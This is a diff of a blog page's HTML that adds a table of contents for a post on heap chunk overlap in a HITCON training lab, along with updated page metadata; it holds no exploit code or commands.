-  
-
   
 
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop mobile" id="toc-div" >
+  
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intorduction"><span class="toc-text">Intorduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Principle"><span class="toc-text">Principle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example"><span class="toc-text">Example</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-Trainging-lab13"><span class="toc-text">HITCON Trainging lab13</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#create"><span class="toc-text">create</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit"><span class="toc-text">edit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show-delete"><span class="toc-text">show &amp; delete</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#step-1"><span class="toc-text">step_1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step-2"><span class="toc-text">step_2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step-3"><span class="toc-text">step_3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step-4"><span class="toc-text">step_4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#step-5"><span class="toc-text">step_5</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -3858,7 +3313,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/PWN/","name":"PWN"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2020/10/27/pwn_overlap/","name":"water one water"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"water one water","description":"Chunk_extend &amp; Overlap","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/10/27/pwn_overlap/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2020/10/27/pwn_overlap/","wordCount":26,"datePublished":"2020-10-27T00:00:00.000Z","dateModified":"2024-02-27T13:11:48.641Z","articleSection":"PWN","keywords":"pwn,heap,chunk_extend,overlap","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
